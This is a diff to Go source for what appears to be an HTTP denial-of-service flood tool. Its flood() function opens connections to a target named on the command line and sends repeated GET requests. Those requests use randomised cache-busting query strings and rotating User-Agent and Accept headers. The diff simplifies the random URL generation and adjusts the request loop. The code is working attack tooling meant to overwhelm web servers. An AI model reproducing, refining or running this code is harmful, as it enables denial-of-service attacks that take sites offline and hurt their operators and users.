@@ -151,7 +151,7 @@ func flood() {
 		if os.Args[7] == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 			header += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
-			header += acceptall[rand.Intn(len(acceptall))] + "\r\n"
+			header += acceptall[rand.Intn(len(acceptall))]
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
@@ -212,26 +212,11 @@ func flood() {
 			fmt.Println("Connection Down!!!")
 		} else {
 			defer s.Close()
-			ai := rand.Intn(3) //fake random url format
-			for i := 0; i <= 100; i++ {
+			for i := 0; i < 100; i++ {
 				request := ""
 				if os.Args[5] == "get" {
 					request += "GET " + os.Args[4] + page
-					if ai == 0 {
-						request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))])
-					} else if ai == 1 {
-						request += strconv.Itoa(rand.Intn(2147483647)) + strconv.Itoa(rand.Intn(2147483647)) + strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647))
-					} else if ai == 2 {
-						request += string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647))
-						for boring := 0; boring < 7; boring++ {
-							request += string(abcd[rand.Intn(len(abcd))])
-						}
-					} else if ai == 3 {
-						request += strconv.Itoa(rand.Intn(2147483647))
-						for boring := 0; boring < 10; boring++ {
-							request += string(abcd[rand.Intn(len(abcd))])
-						}
-					}
+					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
 				request += header + "\r\n\r\n"
 				s.Write([]byte(request))
